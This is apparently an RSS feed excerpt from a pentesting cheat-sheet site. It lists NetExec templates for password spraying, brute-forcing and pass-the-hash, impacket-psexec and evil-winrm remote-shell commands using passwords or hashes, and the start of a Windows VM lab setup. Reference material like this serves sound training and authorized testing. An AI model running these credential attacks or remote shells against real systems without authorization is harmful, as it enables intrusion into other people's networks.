channel.title: Winrm on TLDRBins
channel.description: Recent content in Winrm on TLDRBins

item.title: NetExec (nxc)
item.description: Basic Commands Password NTLM Kerberos # Single User, Single Password nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' # Single User, Single Password, Local Auth nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth # Single User, Single Password (Active Directory) nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> # Single User, Multiple Passwords nxc <PROTOCOL> <TARGET> -u '<USER>' -p <PASSWORDS> -d <DOMAIN> # Multiple Users, Single Password nxc <PROTOCOL> <TARGET> -u <USERS> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success # Multiple Users, Multiple Passwords nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> -d <DOMAIN> --continue-on-success # Match Username to Corresponding Password nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> --no-bruteforce --continue-on-success nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k # With Kerberos ccache, or STATUS_NOT_SUPPORTED (NTLM disabled) sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache Hint: We can also run on multiple targets

item.title: Winrm
item.description: Psexec Password Hash # Domain auth impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' # Local auth impacket-psexec '<USER>:<PASSWORD>@<TARGET>' # Domain auth impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> # Local auth impacket-psexec '<USER>@<TARGET>' -hashes :<HASH> Evil-Winrm Password Hash Kerberos crt & key evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>' $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.

item.title: Winrm from Windows VM
item.description: Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client 2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center' | | 2. Click 'Local Area Connection' | | 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' | | 4. Under 'General', check 'Obtain an IP address automatically' | | 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP> | +-----------------------------------------------------------------------------------+ 3.
